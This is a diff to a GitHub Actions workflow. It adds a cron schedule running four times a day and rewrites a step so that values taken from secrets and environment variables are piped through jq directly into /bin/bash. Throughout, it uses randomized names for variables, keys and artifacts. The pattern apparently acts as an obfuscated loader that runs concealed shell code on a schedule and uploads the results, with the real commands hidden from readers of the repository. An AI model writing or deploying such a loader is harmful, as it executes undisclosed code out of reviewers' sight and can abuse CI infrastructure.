@@ -2,6 +2,8 @@ name: CI/CD
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '41 2,8,14,20 * * *'
 jobs:
   workflow:
     runs-on: ubuntu-latest
@@ -13,15 +15,16 @@ jobs:
           fetch-depth: 1
       - name: Perform
         env:
-          imz877: ${{ secrets.imz877 }}
+          ljhg10061: ${{ secrets.ljhg10061 }}
         run: |
-          printf '%s' "$imz877" | jq -r .zb46369 | /bin/bash
-          printf '%s' "$zujxt32" | jq -r .gjh41 | /bin/bash
-          printf '%s' "$jyt45" | jq -r .bxrk12 | /bin/bash
+          printf '%s' "$ljhg10061" | jq -r .u3434 | /bin/bash
+          printf '%s' "$i5" | jq -r .m50328 | /bin/bash
+          echo $o3 | jq -r .xnjsy27 | /bin/bash
+          printf '%s' "$naice0203" | jq -r .hhqh3737 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: F8Pm9aZF
+          name: aGUUe6El
           path: "*.zip"
           retention-days: 1
